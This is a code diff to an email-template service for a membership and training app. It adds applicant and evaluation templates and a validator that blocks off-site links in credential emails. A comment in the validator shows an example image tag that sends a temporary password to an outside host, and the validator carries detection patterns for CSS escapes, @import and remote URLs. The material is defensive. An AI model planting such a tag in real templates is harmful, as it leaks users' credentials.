@@ -7,7 +7,9 @@ Manages CRUD operations for email templates and renders them with context variab
 import re
 import uuid
 from datetime import datetime, time, timedelta, timezone
+from html.parser import HTMLParser
 from typing import Any, Callable, Dict, List, Optional, Tuple
+from urllib.parse import urlsplit
 
 from loguru import logger
 from sqlalchemy import and_, func, select
@@ -27,6 +29,8 @@ from app.models.email_template import (
     MessageHistory,
 )
 from app.services import email_footers as _footers
+from app.services import email_templates_attendance_waivers as _waiver_templates
+from app.services import email_templates_evaluations as _evaluation_templates
 from app.services import email_templates_storefront as _storefront_templates
 from app.services.branding_service import email_logo_src
 from app.services.email_theme import (  # noqa: F401  (re-exported: many services import DEFAULT_CSS from here)
@@ -661,6 +665,144 @@ TEMPLATE_VARIABLES: Dict[str, List[Dict[str, str]]] = {
             ),
         },
     ],
+    "application_follow_up_form": [
+        {"name": "first_name", "description": "Applicant's first name"},
+        {"name": "applicant_name", "description": "Applicant's full name"},
+        {"name": "form_name", "description": "Name of the follow-up form"},
+        {
+            "name": "form_url",
+            "description": "The applicant's personal link to the form",
+        },
+        {
+            "name": "custom_message",
+            "description": "The stage's custom message, as written",
+        },
+        {
+            "name": "custom_message_html",
+            "description": (
+                "The stage's custom message as a paragraph, omitted entirely "
+                "when the stage has none"
+            ),
+        },
+        {
+            "name": "custom_message_text",
+            "description": (
+                "The stage's custom message followed by a blank line, omitted "
+                "entirely when the stage has none (for the plain-text body)"
+            ),
+        },
+    ],
+    "application_contact_changed": [
+        {"name": "first_name", "description": "Applicant's first name"},
+        {"name": "applicant_name", "description": "Applicant's full name"},
+        {
+            "name": "changed_details",
+            "description": (
+                'What changed, in words ("email address"). Never the new value'
+            ),
+        },
+    ],
+    "application_follow_up_reminder": [
+        {"name": "first_name", "description": "Applicant's first name"},
+        {"name": "applicant_name", "description": "Applicant's full name"},
+        {"name": "form_name", "description": "Name of the follow-up form"},
+        {
+            "name": "form_url",
+            "description": "The applicant's personal link to the form",
+        },
+        {
+            "name": "reminder_number",
+            "description": "Which reminder this is: 1, 2 or 3",
+        },
+        {
+            "name": "draft_note_html",
+            "description": (
+                "A paragraph saying their answers so far are saved, omitted "
+                "entirely when they have saved none"
+            ),
+        },
+        {
+            "name": "draft_note_text",
+            "description": (
+                "The same note followed by a blank line, omitted entirely when "
+                "they have saved none (for the plain-text body)"
+            ),
+        },
+    ],
+    "application_follow_up_submitted": [
+        {"name": "recipient_name", "description": "Coordinator's display name"},
+        {"name": "applicant_name", "description": "Applicant's full name"},
+        {"name": "form_name", "description": "Name of the follow-up form"},
+        {"name": "stage_name", "description": "The stage that sent the form"},
+        {
+            "name": "applicant_url",
+            "description": "Link to the applicant in the pipeline",
+        },
+        {
+            "name": "contact_note_html",
+            "description": (
+                "A paragraph saying the applicant changed their email or phone, "
+                "omitted entirely when they did not"
+            ),
+        },
+        {
+            "name": "contact_note_text",
+            "description": (
+                "The same note followed by a blank line, omitted entirely when "
+                "they did not (for the plain-text body)"
+            ),
+        },
+    ],
+    "application_assigned": [
+        {"name": "recipient_name", "description": "Assigned member's name"},
+        {"name": "applicant_name", "description": "Applicant's full name"},
+        {
+            "name": "role_label",
+            "description": 'What they were assigned as ("case manager", "interviewer")',
+        },
+        {"name": "assigned_by_name", "description": "Who made the assignment"},
+        {
+            "name": "applicant_url",
+            "description": "Link to the applicant on the member's My Applicants page",
+        },
+    ],
+    "application_needs_attention": [
+        {"name": "recipient_name", "description": "Case manager's name"},
+        {"name": "applicant_name", "description": "Applicant's full name"},
+        {
+            "name": "event_summary",
+            "description": (
+                "What happened, as a sentence ending in a full stop: "
+                '"Alex Johnson submitted their follow-up form."'
+            ),
+        },
+        {
+            "name": "applicant_url",
+            "description": "Link to the applicant on the member's My Applicants page",
+        },
+    ],
+    "application_interview_requested": [
+        {"name": "recipient_name", "description": "Interviewer's name"},
+        {"name": "applicant_name", "description": "Applicant's full name"},
+        {"name": "stage_name", "description": "The interview stage reached"},
+        {
+            "name": "interview_url",
+            "description": "Link to the applicant's Interview page",
+        },
+    ],
+    "shift_evaluation_preceptor_link": [
+        {"name": "member_name", "description": "The evaluated member's name"},
+        {"name": "shift_date", "description": "The date of the shift"},
+        {
+            "name": "unit_label",
+            "description": "The outside agency and unit the shift was on",
+        },
+        {
+            "name": "evaluation_url",
+            "description": "The no-login link to the evaluation form",
+        },
+        {"name": "expires_on", "description": "When the link stops working"},
+    ],
     "suggestion_submitted": [
         {"name": "recipient_name", "description": "Reviewer's display name"},
         {"name": "box_name", "description": "Name of the suggestion box"},
@@ -909,6 +1051,8 @@ def _sample(*dicts: Dict[str, str]) -> Dict[str, str]:
 # default bodies in their own module — ten more entries inline here would
 # bury the rest.
 TEMPLATE_VARIABLES.update(_storefront_templates.TEMPLATE_VARIABLES)
+TEMPLATE_VARIABLES.update(_evaluation_templates.TEMPLATE_VARIABLES)
+TEMPLATE_VARIABLES.update(_waiver_templates.TEMPLATE_VARIABLES)
 
 SAMPLE_CONTEXT: Dict[str, Dict[str, str]] = {
     "welcome": _sample(
@@ -1345,6 +1489,101 @@ SAMPLE_CONTEXT: Dict[str, Dict[str, str]] = {
             "custom_message_text": "Your interview will be scheduled next.\n\n",
         }
     ),
+    "application_follow_up_form": _sample(
+        {
+            "first_name": "Alex",
+            "applicant_name": "Alex Johnson",
+            "form_name": "Background Questionnaire",
+            "form_url": "https://example.com/application-form/sample-token",
+            "custom_message": "Please complete this before your interview.",
+            "custom_message_html": (
+                "<p>Please complete this before your interview.</p>"
+            ),
+            "custom_message_text": "Please complete this before your interview.\n\n",
+        }
+    ),
+    "application_contact_changed": _sample(
+        {
+            "first_name": "Alex",
+            "applicant_name": "Alex Johnson",
+            "changed_details": "email address",
+        }
+    ),
+    "application_follow_up_reminder": _sample(
+        {
+            "first_name": "Alex",
+            "applicant_name": "Alex Johnson",
+            "form_name": "Background Questionnaire",
+            "form_url": "https://example.com/application-form/sample-token",
+            "reminder_number": "1",
+            "draft_note_html": (
+                "<p>The answers you have saved so far are still there.</p>"
+            ),
+            "draft_note_text": (
+                "The answers you have saved so far are still there.\n\n"
+            ),
+        }
+    ),
+    "application_follow_up_submitted": _sample(
+        {
+            "recipient_name": "Captain Maria Lopez",
+            "applicant_name": "Alex Johnson",
+            "form_name": "Background Questionnaire",
+            "stage_name": "Background Questionnaire",
+            "applicant_url": "https://example.org/prospective-members?applicant=sample",
+            "contact_note_html": (
+                "<p><strong>The applicant changed their contact details.</strong>"
+                " Check them on the applicant's page.</p>"
+            ),
+            "contact_note_text": (
+                "The applicant changed their contact details. Check them on "
+                "the applicant's page.\n\n"
+            ),
+        }
+    ),
+    "application_assigned": _sample(
+        {
+            "recipient_name": "Captain Maria Lopez",
+            "applicant_name": "Alex Johnson",
+            "role_label": "interviewer",
+            "assigned_by_name": "Sam Reed",
+            "applicant_url": (
+                "https://example.org/prospective-members/my-applicants?applicant=sample"
+            ),
+        }
+    ),
+    "application_needs_attention": _sample(
+        {
+            "recipient_name": "Captain Maria Lopez",
+            "applicant_name": "Alex Johnson",
+            "event_summary": (
+                "Alex Johnson has reached the Board Interview stage, which "
+                "needs interviews."
+            ),
+            "applicant_url": (
+                "https://example.org/prospective-members/my-applicants?applicant=sample"
+            ),
+        }
+    ),
+    "application_interview_requested": _sample(
+        {
+            "recipient_name": "Captain Maria Lopez",
+            "applicant_name": "Alex Johnson",
+            "stage_name": "Board Interview",
+            "interview_url": (
+                "https://example.org/prospective-members/sample/interview"
+            ),
+        }
+    ),
+    "shift_evaluation_preceptor_link": _sample(
+        {
+            "member_name": "Terry Jones",
+            "shift_date": "November 10, 2026",
+            "unit_label": "ACFD Medic 101",
+            "evaluation_url": "https://example.org/shift-evaluation/sample",
+            "expires_on": "November 17, 2026 at 07:00 PM",
+        }
+    ),
     "suggestion_submitted": _sample(
         {
             "recipient_name": "Captain Maria Lopez",
@@ -1543,11 +1782,20 @@ SAMPLE_CONTEXT: Dict[str, Dict[str, str]] = {
 SAMPLE_CONTEXT.update(
     {key: _sample(value) for key, value in _storefront_templates.SAMPLE_CONTEXT.items()}
 )
+SAMPLE_CONTEXT.update(
+    {key: _sample(value) for key, value in _evaluation_templates.SAMPLE_CONTEXT.items()}
+)
+SAMPLE_CONTEXT.update(
+    {key: _sample(value) for key, value in _waiver_templates.SAMPLE_CONTEXT.items()}
+)
 
 # The sample links' placeholder host. Only the host is replaced: each path is
 # the one the real sender builds (``/events/{id}``, ``/training/approve/…``),
 # so a test link lands on the right screen of this deployment.
-_SAMPLE_LINK_HOST = re.compile(r"^https://example\.(?:com|org)(?=/|$)")
+# Matched wherever a link starts, not only at the start of a value: the
+# waiver request's buttons and plain-text links carry two links each inside
+# markup or prose. The lookbehind keeps it from matching inside a longer URL.
+_SAMPLE_LINK_HOST = re.compile(r"(?<![\w./:@-])https://example\.(?:com|org)(?=/|$)")
 
 
 # Who a test email is addressed to, per template type: {variable: form}.
@@ -1594,6 +1842,29 @@ TEST_RECIPIENT_FIELDS: Dict[str, Dict[str, str]] = {
     "application_step_completed": {"first_name": "first", "applicant_name": "full"},
     "application_status_link": {"first_name": "first", "applicant_name": "full"},
     "application_going_inactive": {"first_name": "first", "applicant_name": "full"},
+    "application_follow_up_form": {"first_name": "first", "applicant_name": "full"},
+    "application_contact_changed": {"first_name": "first", "applicant_name": "full"},
+    "application_follow_up_reminder": {
+        "first_name": "first",
+        "applicant_name": "full",
+    },
+    "application_follow_up_submitted": {
+        "recipient_name": "full",
+        "applicant_name": "full",
+    },
+    "application_assigned": {
+        "recipient_name": "full",
+        "applicant_name": "full",
+        "assigned_by_name": "full",
+    },
+    "application_needs_attention": {
+        "recipient_name": "full",
+        "applicant_name": "full",
+    },
+    "application_interview_requested": {
+        "recipient_name": "full",
+        "applicant_name": "full",
+    },
     "suggestion_submitted": {"recipient_name": "full"},
     "equipment_request_update": {"member_name": "full"},
     "external_course_match": {"recipient_name": "full"},
@@ -1606,6 +1877,8 @@ TEST_RECIPIENT_FIELDS: Dict[str, Dict[str, str]] = {
         "customer_name": "legal_full",
     },
 }
+TEST_RECIPIENT_FIELDS.update(_evaluation_templates.TEST_RECIPIENT_FIELDS)
+TEST_RECIPIENT_FIELDS.update(_waiver_templates.TEST_RECIPIENT_FIELDS)
 
 _DATE_TIME = "%B %d, %Y at %I:%M %p"
 _DATE = "%B %d, %Y"
@@ -1638,6 +1911,10 @@ TEST_SAMPLE_DATES: Dict[
         "event_day": (1, time(19, 0), _day_of_month),
     },
     "series_end_reminder": {"series_end_date": (14, None, _strf(_DATE))},
+    "shift_evaluation_preceptor_link": {
+        "shift_date": (-1, None, _strf(_DATE)),
+        "expires_on": (6, time(19, 0), _strf(_DATE_TIME)),
+    },
     "event_cancellation": {"event_date": (3, None, _strf(_DATE))},
     "event_waitlist_promotion": {"event_start": (2, time(19, 0), _strf(_DATE_TIME))},
     "training_approval": {
@@ -1694,6 +1971,18 @@ TEST_SAMPLE_DATES: Dict[
         "shift_start": (1, time(6, 0), _strf("%H:%M")),
     },
 }
+TEST_SAMPLE_DATES.update(
+    {
+        key: {"due_date": (days, None, _strf(_DATE))}
+        for key, days in _evaluation_templates.SAMPLE_DUE_DAYS.items()
+    }
+)
+TEST_SAMPLE_DATES.update(
+    {
+        key: {"session_date": (days, None, _strf(_DATE))}
+        for key, days in _waiver_templates.SAMPLE_SESSION_DAYS.items()
+    }
+)
 
 
 # Dates that sit inside a prose value rather than a variable of their own:
@@ -1706,6 +1995,11 @@ TEST_SAMPLE_PROSE_DATES: Dict[str, Dict[str, int]] = {
     "storefront_vendor_order_placed": {"window_extra_html": 30},
     # The completion date of the record that was voided.
     "training_record_voided": {"details_html": -30, "details_text": -30},
+    # The waiver notices' summary quotes the session's date.
+    **{
+        key: {"summary": days}
+        for key, days in _waiver_templates.SAMPLE_SESSION_DAYS.items()
+    },
 }
 
 _PROSE_DATE = re.compile(
@@ -2606,6 +2900,262 @@ DEFAULT_APPLICATION_GOING_INACTIVE_SUBJECT = (
     "Your application with {{organization_name}} is going inactive"
 )
 
+# Sent by a Follow-up Form stage with the applicant's personal link to the
+# form. The link works until the form is submitted, so the email says nothing
+# about it expiring.
+DEFAULT_APPLICATION_FOLLOW_UP_FORM_HTML = build_shell(
+    "A Form for Your Membership Application",
+    """        <p>Hi {{first_name}},</p>
+        {{custom_message_html}}
+        <p>The next step in your membership application with
+        {{organization_name}} is a short form: <strong>{{form_name}}</strong>.
+        We have filled in what we already know, so please check it and correct
+        anything that has changed. Your answers are saved as you go, so you can
+        finish it later.</p>
+""" + action("{{form_url}}", "Open the Form"),
+    accent=ACCENT_BLUE,
+    chip="Application update",
+)
+
+DEFAULT_APPLICATION_FOLLOW_UP_FORM_TEXT = """A Form for Your Membership Application
+
+Hi {{first_name}},
+
+{{custom_message_text}}The next step in your membership application with
+{{organization_name}} is a short form: {{form_name}}. We have filled in what
+we already know, so please check it and correct anything that has changed.
+Your answers are saved as you go, so you can finish it later.
+
+Open the form: {{form_url}}
+
+{{footer_text}}"""
+
+DEFAULT_APPLICATION_FOLLOW_UP_FORM_SUBJECT = (
+    "{{form_name}}: the next step in your application"
+)
+
+# Sent to the address an applicant's application used to have, after a
+# follow-up form changed it. It names what changed
+# and never the new value: if somebody else changed it, this is how the real
+# applicant finds out, and it must not hand the impostor's details to them or
+# the impostor's address to anyone reading the old mailbox.
+DEFAULT_APPLICATION_CONTACT_CHANGED_HTML = build_shell(
+    "Your Contact Details Were Changed",
+    """        <p>Hi {{first_name}},</p>
+        <p>The {{changed_details}} on your membership application with
+        {{organization_name}} was just changed through a follow-up form.</p>
+        <p>If you made this change, there is nothing more to do. If you did
+        not, please contact the department right away.</p>""",
+    accent=ACCENT_AMBER,
+    chip="Application update",
+)
+
+DEFAULT_APPLICATION_CONTACT_CHANGED_TEXT = """Your Contact Details Were Changed
+
+Hi {{first_name}},
+
+The {{changed_details}} on your membership application with
+{{organization_name}} was just changed through a follow-up form.
+
+If you made this change, there is nothing more to do. If you did not, please
+contact the department right away.
+
+{{footer_text}}"""
+
+DEFAULT_APPLICATION_CONTACT_CHANGED_SUBJECT = (
+    "The contact details on your application were changed"
+)
+
+# Sent every seven days, up to three times, while a follow-up form is
+# unsubmitted. Carries the same link as the first email: the link does not
+# change, so a reminder is never a reason to distrust the earlier one.
+DEFAULT_APPLICATION_FOLLOW_UP_REMINDER_HTML = build_shell(
+    "A Reminder About Your Form",
+    """        <p>Hi {{first_name}},</p>
+        <p>This is a reminder that <strong>{{form_name}}</strong> is still
+        waiting for you as part of your membership application with
+        {{organization_name}}.</p>
+        {{draft_note_html}}
+""" + action("{{form_url}}", "Open the Form"),
+    accent=ACCENT_BLUE,
+    chip="Application update",
+)
+
+DEFAULT_APPLICATION_FOLLOW_UP_REMINDER_TEXT = """A Reminder About Your Form
+
+Hi {{first_name}},
+
+This is a reminder that {{form_name}} is still waiting for you as part of your
+membership application with {{organization_name}}.
+
+{{draft_note_text}}Open the form: {{form_url}}
+
+{{footer_text}}"""
+
+DEFAULT_APPLICATION_FOLLOW_UP_REMINDER_SUBJECT = "Reminder: {{form_name}}"
+
+# Sent to the membership coordinators when an applicant submits a follow-up
+# form. Carries a link only, never the answers: an email cannot be taken back,
+# and the answers can include sensitive ones. An administrator editing this
+# template should keep it that way.
+DEFAULT_APPLICATION_FOLLOW_UP_SUBMITTED_HTML = build_shell(
+    "Follow-up Form Submitted",
+    """        <p>Hello {{recipient_name}},</p>
+        <p>{{applicant_name}} submitted <strong>{{form_name}}</strong> for the
+        {{stage_name}} stage of their membership application.</p>
+        {{contact_note_html}}
+        <p>Open the applicant in the Logbook to read their answers.</p>
+""" + action("{{applicant_url}}", "View Applicant"),
+    accent=ACCENT_BLUE,
+    chip="Membership pipeline",
+)
+
+DEFAULT_APPLICATION_FOLLOW_UP_SUBMITTED_TEXT = """Follow-up Form Submitted
+
+Hello {{recipient_name}},
+
+{{applicant_name}} submitted {{form_name}} for the {{stage_name}} stage of
+their membership application.
+
+{{contact_note_text}}Open the applicant in the Logbook to read their answers.
+
+View applicant: {{applicant_url}}
+
+{{footer_text}}"""
+
+DEFAULT_APPLICATION_FOLLOW_UP_SUBMITTED_SUBJECT = (
+    "{{applicant_name}} submitted {{form_name}}"
+)
+
+# Sent to a member assigned to an applicant as case manager or interviewer.
+# The assignment is what lets them see the applicant at all, so this email is
+# how a member with no other pipeline access learns there is something to do.
+# It names the applicant and links to them, and carries nothing from the file.
+DEFAULT_APPLICATION_ASSIGNED_HTML = build_shell(
+    "You Have Been Assigned an Applicant",
+    """        <p>Hello {{recipient_name}},</p>
+        <p>{{assigned_by_name}} assigned you as <strong>{{role_label}}</strong>
+        for {{applicant_name}}, who is applying for membership.</p>
+        <p>You can see their application from My Applicants in the Logbook.</p>
+""" + action("{{applicant_url}}", "Open My Applicants"),
+    accent=ACCENT_BLUE,
+    chip="Membership pipeline",
+)
+
+DEFAULT_APPLICATION_ASSIGNED_TEXT = """You Have Been Assigned an Applicant
+
+Hello {{recipient_name}},
+
+{{assigned_by_name}} assigned you as {{role_label}} for {{applicant_name}}, who
+is applying for membership. You can see their application from My Applicants
+in the Logbook.
+
+Open My Applicants: {{applicant_url}}
+
+{{footer_text}}"""
+
+DEFAULT_APPLICATION_ASSIGNED_SUBJECT = (
+    "You are now {{role_label}} for {{applicant_name}}"
+)
+
+# Sent to an applicant's case managers when the applicant needs them: a
+# follow-up form came in, the applicant withdrew, or they reached a stage that
+# waits on interviews or sign-offs. Coordinators get their own notices for
+# these; a case manager need not be a coordinator, and is told here. Like the
+# assignment email it carries a link and a one-line summary, never anything
+# from the file.
+DEFAULT_APPLICATION_NEEDS_ATTENTION_HTML = build_shell(
+    "An Applicant Needs Your Attention",
+    """        <p>Hello {{recipient_name}},</p>
+        <p>{{event_summary}}</p>
+        <p>You are {{applicant_name}}'s case manager. You can see their
+        application from My Applicants in the Logbook.</p>
+""" + action("{{applicant_url}}", "Open My Applicants"),
+    accent=ACCENT_BLUE,
+    chip="Membership pipeline",
+)
+
+DEFAULT_APPLICATION_NEEDS_ATTENTION_TEXT = """An Applicant Needs Your Attention
+
+Hello {{recipient_name}},
+
+{{event_summary}}
+
+You are {{applicant_name}}'s case manager. You can see their application from
+My Applicants in the Logbook.
+
+Open My Applicants: {{applicant_url}}
+
+{{footer_text}}"""
+
+DEFAULT_APPLICATION_NEEDS_ATTENTION_SUBJECT = "{{applicant_name}} needs your attention"
+
+# Sent to an applicant's assigned interviewers when the applicant reaches an
+# Interview Requirement stage, so the people being asked to interview hear of
+# it directly. Links to the applicant's Interview page and carries nothing from
+# the file.
+DEFAULT_APPLICATION_INTERVIEW_REQUESTED_HTML = build_shell(
+    "An Interview Is Requested",
+    """        <p>Hello {{recipient_name}},</p>
+        <p>{{applicant_name}} has reached the {{stage_name}} stage of their
+        application, and you are one of their interviewers.</p>
+        <p>When you have interviewed them, record it on their Interview page in
+        the Logbook.</p>
+""" + action("{{interview_url}}", "Open the Interview page"),
+    accent=ACCENT_BLUE,
+    chip="Membership pipeline",
+)
+
+DEFAULT_APPLICATION_INTERVIEW_REQUESTED_TEXT = """An Interview Is Requested
+
+Hello {{recipient_name}},
+
+{{applicant_name}} has reached the {{stage_name}} stage of their application,
+and you are one of their interviewers.
+
+When you have interviewed them, record it on their Interview page in the
+Logbook.
+
+Open the Interview page: {{interview_url}}
+
+{{footer_text}}"""
+
+DEFAULT_APPLICATION_INTERVIEW_REQUESTED_SUBJECT = (
+    "Interview requested: {{applicant_name}}"
+)
+
+# Sent to an outside agency's preceptor so they can fill out a member's shift
+# evaluation without an account. The link is the only credential, and the
+# email carries the member's name, the shift and the unit and nothing else
+# from the member's record.
+DEFAULT_SHIFT_EVALUATION_PRECEPTOR_LINK_HTML = build_shell(
+    "Shift Evaluation Requested",
+    """        <p>Hello,</p>
+        <p>{{organization_name}} asks you to evaluate {{member_name}} for the
+        shift on {{shift_date}} on {{unit_label}}.</p>
+        <p>The link opens the evaluation form. No account is needed. It can be
+        submitted once and works until {{expires_on}}.</p>
+""" + action("{{evaluation_url}}", "Open the evaluation"),
+    accent=ACCENT_BLUE,
+    chip="Training",
+)
+
+DEFAULT_SHIFT_EVALUATION_PRECEPTOR_LINK_TEXT = """Shift Evaluation Requested
+
+Hello,
+
+{{organization_name}} asks you to evaluate {{member_name}} for the shift on
+{{shift_date}} on {{unit_label}}.
+
+The link opens the evaluation form. No account is needed. It can be submitted
+once and works until {{expires_on}}.
+
+Open the evaluation: {{evaluation_url}}
+
+{{footer_text}}"""
+
+DEFAULT_SHIFT_EVALUATION_PRECEPTOR_LINK_SUBJECT = "Shift evaluation for {{member_name}}"
+
 # Sent to a box's reviewers when a submission arrives. Deliberately carries no
 # submission content: a complaint copied into mailboxes is out of the
 # department's control for good, so the text stays in the application. An
@@ -3464,6 +4014,11 @@ ALWAYS_SENT_TYPES: frozenset = frozenset(
         EmailTemplateType.WELCOME,
         EmailTemplateType.BALLOT_NOTIFICATION,
         EmailTemplateType.APPLICATION_STATUS_LINK,
+        # The form link and the old-address notice: the first is the only way
+        # the applicant reaches the form, the second the only warning of an
+        # address taken over through a forwarded link.
+        EmailTemplateType.APPLICATION_FOLLOW_UP_FORM,
+        EmailTemplateType.APPLICATION_CONTACT_CHANGED,
     }
 )
 
@@ -3475,6 +4030,201 @@ def is_always_sent(template_type: Any) -> bool:
         )
     except ValueError:
         return False
+
+
+# Templates a department's default CC, BCC and CC positions never reach
+# (defect D1, owner decision 2026-11-10). Two reasons, both about what a copy
+# would hand to somebody else:
+#
+# * The credential-carrying templates (``ALWAYS_SENT_TYPES``): the welcome
+#   email's temporary password, a password reset or IT reset link, a ballot
+#   link (a copy is a second vote), and an applicant's private status and
+#   follow-up links. There is no MFA or sign-in-code template; those go out
+#   from ``security_notifications`` under types no template row carries.
+# * The attendance-waiver templates, which send their copies themselves: an
+#   approver's email carries Approve and Deny buttons and a copy must not, so
+#   ``AttendanceWaiverEmails`` mails each copy separately, without them.
+#
+# ``CUSTOM`` is not here because it is excluded more fundamentally: many
+# custom templates share the type, so "the template" is not one row.
+NO_TEMPLATE_COPY_TYPES: frozenset = ALWAYS_SENT_TYPES | frozenset(
+    {
+        EmailTemplateType.SESSION_WAIVER_REQUESTED,
+        EmailTemplateType.SESSION_WAIVER_DECIDED,
+        EmailTemplateType.SESSION_WAIVER_WITHDRAWN,
+        EmailTemplateType.MEETING_WAIVER_REQUESTED,
+        EmailTemplateType.MEETING_WAIVER_DECIDED,
+        EmailTemplateType.MEETING_WAIVER_WITHDRAWN,
+    }
+)
+
+
+def _unique_addresses(addresses: List[str]) -> List[str]:
+    """``addresses`` trimmed, blanks dropped, first spelling of each kept."""
+    seen: set = set()
+    out: List[str] = []
+    for address in addresses:
+        cleaned = str(address or "").strip()
+        if cleaned and cleaned.casefold() not in seen:
+            seen.add(cleaned.casefold())
+            out.append(cleaned)
+    return out
+
+
+def template_copies_apply(template_type: Any) -> bool:
+    """Whether a send of ``template_type`` takes its template's default copies.
+
+    Only a type that names exactly one stored template does: not ``CUSTOM``,
+    not a sender's own label (``"department_message"``), and nothing in
+    ``NO_TEMPLATE_COPY_TYPES``.
+    """
+    try:
+        resolved = EmailTemplateType(getattr(template_type, "value", template_type))
+    except ValueError:
+        return False
+    return resolved != EmailTemplateType.CUSTOM and (
+        resolved not in NO_TEMPLATE_COPY_TYPES
+    )
+
+
+# Attributes whose value a mail client fetches or follows. A credential
+# template that loads or links anything outside the department's own app is
+# how a rewritten body carries a temporary password or a reset token off-site:
+# `<img src="https://elsewhere/?p={{temp_password}}">` reports it the moment the
+# email is opened, from the department's own sender.
+_URL_ATTRIBUTES = frozenset(
+    {
+        "href",
+        "src",
+        "srcset",
+        "background",
+        "action",
+        "formaction",
+        "poster",
+        "data",
+        "xlink:href",
+        "cite",
+        "longdesc",
+        "lowsrc",
+        "dynsrc",
+        "ping",
+    }
+)
+_LONE_PLACEHOLDER = re.compile(r"^\s*\{\{\s*\w+\s*\}\}\s*$")
+_CSS_URL = re.compile(r"url\s*\(\s*['\"]?([^'\")]*)", re.IGNORECASE)
+_CSS_IMPORT = re.compile(r"@import", re.IGNORECASE)
+# Any absolute or protocol-relative URL anywhere in CSS, not only inside
+# url(): image-set() and some @font-face forms take a bare quoted string.
+_CSS_ABSOLUTE_URL = re.compile(r"(?:[a-z][a-z0-9+.-]*:)?//[^\s'\")]+", re.IGNORECASE)
+
+
+def _own_hosts() -> frozenset:
+    host = urlsplit(app_settings.FRONTEND_URL or "").hostname
+    return frozenset({host.lower()}) if host else frozenset()
+
+
+def _link_is_allowed(value: str, own_hosts: frozenset) -> bool:
+    value = value.strip()
+    if not value or value.startswith("#") or _LONE_PLACEHOLDER.match(value):
+        return True
+    # A placeholder spliced into any larger URL is the exfiltration shape,
+    # whichever host it points at: only a placeholder standing alone (the
+    # shipped defaults' `href="{{reset_url}}"`) is a link the system built.
+    if "{{" in value:
+        return False
+    lowered = value.lower()
+    if lowered.startswith(("mailto:", "tel:")):
+        return True
+    parts = urlsplit(value)
+    if parts.scheme in ("http", "https") and parts.hostname:
+        return parts.hostname.lower() in own_hosts
+    return False
+
+
+class _LinkCollector(HTMLParser):
+    def __init__(self) -> None:
+        super().__init__(convert_charrefs=True)
+        self.links: List[str] = []
+        self.css: List[str] = []
+        self._in_style = False
+
+    def handle_starttag(self, tag: str, attrs: List[Tuple[str, Optional[str]]]):
+        self._in_style = tag == "style"
+        for name, value in attrs:
+            if value is None:
+                continue
+            if name in _URL_ATTRIBUTES:
+                if name == "srcset":
+                    # "url 2x, url 3x": every candidate's URL is a fetch.
+                    self.links.extend(
+                        entry.split()[0] for entry in value.split(",") if entry.split()
+                    )
+                elif name == "ping":
+                    # A space-separated list of URLs, each pinged on click.
+                    self.links.extend(value.split())
+                else:
+                    self.links.append(value)
+            elif name == "style":
+                self.css.append(value)
+
+    def handle_endtag(self, tag: str) -> None:
+        if tag == "style":
+            self._in_style = False
+
+    def handle_comment(self, data: str) -> None:
+        # Outlook renders the body of an `<!--[if mso]>...<![endif]-->`
+        # conditional comment as markup, so it is held to the same policy.
+        # The shipped templates' own conditionals are bare table wrappers and
+        # carry no link.
+        nested = _LinkCollector()
+        nested.feed(data)
+        nested.close()
+        self.links.extend(nested.links)
+        self.css.extend(nested.css)
+
+    def handle_data(self, data: str) -> None:
+        if self._in_style:
+            self.css.append(data)
+
+
+def protected_template_link_problems(html_body: Optional[str]) -> List[str]:
+    """Links and fetches in a credential template's HTML that are refused.
+
+    Applies to ``ALWAYS_SENT_TYPES`` only: those carry a temporary password, a
+    reset or ballot token, or an applicant's private link. Allowed: a lone
+    placeholder (``{{reset_url}}``), a link to the app's own host
+    (``FRONTEND_URL``), ``mailto:``/``tel:`` and in-page anchors. Everything
+    else — a remote image, a stylesheet, a link to another site, a placeholder
+    inside a larger URL — is returned so the save can be refused with the
+    reason, rather than silently stripped and saved as something the editor
+    did not write.
+    """
+    if not html_body:
+        return []
+    collector = _LinkCollector()
+    collector.feed(html_body)
+    collector.close()
+    own_hosts = _own_hosts()
+    problems = [
+        link for link in collector.links if not _link_is_allowed(link, own_hosts)
+    ]
+    for css in collector.css:
+        # A CSS escape spells a word without its letters (`u\72l(` is
+        # `url(`), which no pattern match can follow; the shipped templates
+        # use none, so a credential template may not either.
+        if "\\" in css:
+            problems.append("CSS escape (\\)")
+        if _CSS_IMPORT.search(css):
+            problems.append("@import")
+        problems.extend(
+            url
+            for url in _CSS_ABSOLUTE_URL.findall(css)
+            if not _link_is_allowed(url, own_hosts)
+        )
+        problems.extend(
+            url for url in _CSS_URL.findall(css) if not _link_is_allowed(url, own_hosts)
+        )
+    return problems
 
 
 class EmailTemplateService:
@@ -3505,6 +4255,75 @@ class EmailTemplateService:
         )
         email_template: Optional[EmailTemplate] = result.scalar_one_or_none()
         return email_template
+
+    async def template_copy_recipients(
+        self, organization_id: str, template_type: Any
+    ) -> Tuple[List[str], List[str]]:
+        """The CC and BCC addresses a send of ``template_type`` copies.
+
+        The stored template's ``default_cc``, then the email of every current
+        member holding one of its ``default_cc_position_ids`` (resolved now,
+        so a CC follows whoever holds the post), and its ``default_bcc``.
+        Both lists are de-duplicated, ignoring case, in that order. Empty for
+        a type ``template_copies_apply`` rules out, and for a department with
+        no stored row: the code defaults copy nobody.
+        """
+        if not organization_id or not template_copies_apply(template_type):
+            return [], []
+        return await self.stored_copy_recipients(
+            str(organization_id),
+            EmailTemplateType(getattr(template_type, "value", template_type)),
+        )
+
+    async def stored_copy_recipients(
+        self, organization_id: str, template_type: EmailTemplateType
+    ) -> Tuple[List[str], List[str]]:
+        """The stored template's CC and BCC, whatever ``template_type`` is.
+
+        ``template_copy_recipients`` is the send layer's rule; this is for a
+        sender that mails copies itself (``AttendanceWaiverEmails``), whose
+        types that rule excludes so a copy is never a CC on the original.
+        """
+        template = await self.get_template(str(organization_id), template_type)
+        if template is None:
+            return [], []
+        cc = list(template.default_cc or [])
+        position_ids = [str(p) for p in (template.default_cc_position_ids or []) if p]
+        if position_ids:
+            cc.extend(
+                await self.position_holder_emails(str(organization_id), position_ids)
+            )
+        return _unique_addresses(cc), _unique_addresses(template.default_bcc or [])
+
+    async def position_holder_emails(
+        self, organization_id: str, position_ids: List[str]
+    ) -> List[str]:
+        """Emails of current members holding any of ``position_ids``.
+
+        Both the positions and the members are confined to the organization,
+        so a stored id from elsewhere copies nobody (pitfall #14).
+        """
+        from app.models.user import (
+            ACTIVE_ACCOUNT_STATUSES,
+            Position,
+            User,
+            user_positions,
+        )
+
+        rows = await self.db.execute(
+            select(User.email)
+            .join(user_positions, user_positions.c.user_id == User.id)
+            .join(Position, Position.id == user_positions.c.position_id)
+            .where(
+                Position.id.in_(position_ids),
+                Position.organization_id == str(organization_id),
